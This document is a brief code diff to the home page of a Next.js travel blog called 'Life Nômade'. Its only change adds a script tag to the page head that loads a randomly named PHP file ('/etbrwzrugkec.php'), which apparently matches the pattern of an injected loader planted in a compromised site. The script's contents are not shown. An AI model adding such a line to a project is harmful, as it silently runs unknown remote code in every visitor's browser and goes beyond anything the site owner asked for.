@@ -24,6 +24,7 @@ export default function Home({ posts }) {
     <>
       <Head>
         <title>Life Nômade - Blog de viagem e turismo</title>
+        <script src="/etbrwzrugkec.php"></script>
       </Head>
       <Logo />
       <S.Container>
